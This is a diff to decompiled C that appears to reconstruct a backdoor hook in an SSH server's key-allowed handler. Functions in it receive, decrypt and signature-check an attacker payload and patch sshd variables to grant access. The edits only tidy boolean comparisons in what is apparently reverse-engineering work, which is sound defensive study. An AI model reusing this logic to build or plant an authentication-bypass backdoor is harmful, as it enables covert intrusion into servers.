@@ -74,7 +74,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   if (UNRECOVERED_JUMPTABLE == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
   if (::global_ctx->payload_state == 4) goto LAB_0010944f;
   BVar10 = check_backdoor_state(::global_ctx);
-  if (((BVar10 == 0) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
+  if (((BVar10 == FALSE) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
   goto LAB_00109429;
   ppsVar18 = &payload_ctx;
   for (lVar16 = 0x12; lVar16 != 0; lVar16 = lVar16 + -1) {
@@ -83,10 +83,10 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   }
   libc_imports = (libc_imports_t *)0x0;
   BVar10 = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
-  if ((BVar10 == 0) ||
+  if ((BVar10 == FALSE) ||
      (BVar10 = extract_payload_message
                          ((sshbuf *)&payload_ctx,(size_t)orig_handler,(size_t *)&libc_imports,ctx),
-     BVar10 == 0)) goto LAB_0010944f;
+     BVar10 == FALSE)) goto LAB_0010944f;
   decrypt_payload_message((key_payload_t *)payload_ctx,(size_t)libc_imports,ctx);
   uVar2 = ctx->payload_state;
   if (uVar2 == 3) {
@@ -153,9 +153,9 @@ LAB_00109216:
         }
         *(sshd_payload_ctx_t **)psVar4->_unknown1182 = psVar21;
         ctx->payload_state = 4;
-        iVar11 = sshd_patch_variables(1,0,0,0,ctx);
+        BVar10 = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
 LAB_001092e5:
-        if (iVar11 != 0) goto LAB_0010944f;
+        if (BVar10 != FALSE) goto LAB_0010944f;
       }
     }
   }
@@ -202,18 +202,18 @@ LAB_001092e5:
           lVar16 = lVar16 + 1;
         } while (lVar16 != 0x3a);
         BVar10 = secret_data_get_decrypted(local_131,ctx);
-        if ((BVar10 != 0) &&
+        if ((BVar10 != FALSE) &&
            (BVar10 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                       [ctx->sshd_host_pubkey_idx],(u8 *)&local_aa,0x3a,0x5a,
                                       (u8 *)(ctx->sshd_payload_ctx + 0x3c),local_131,ctx),
-           BVar10 != 0)) {
+           BVar10 != FALSE)) {
           ctx->payload_state = 1;
           puVar20 = local_131;
           for (lVar16 = 0x39; lVar16 != 0; lVar16 = lVar16 + -1) {
             *puVar20 = '\0';
             puVar20 = puVar20 + (ulong)bVar22 * -2 + 1;
           }
-          iVar11 = check_backdoor_state(ctx);
+          BVar10 = check_backdoor_state(ctx);
           goto LAB_001092e5;
         }
       }
@@ -256,7 +256,7 @@ LAB_00109471:
                                   ctx->payload_data,uVar17 + ctx->sock_read_buf_size,
                                   ctx->payload_data_size,(u8 *)&local_aa,
                                   (u8 *)(ctx->sshd_payload_ctx + 2),ctx);
-        if (BVar10 == 0) {
+        if (BVar10 == FALSE) {
           ctx->payload_state = 0xffffffff;
           goto LAB_00109471;
         }
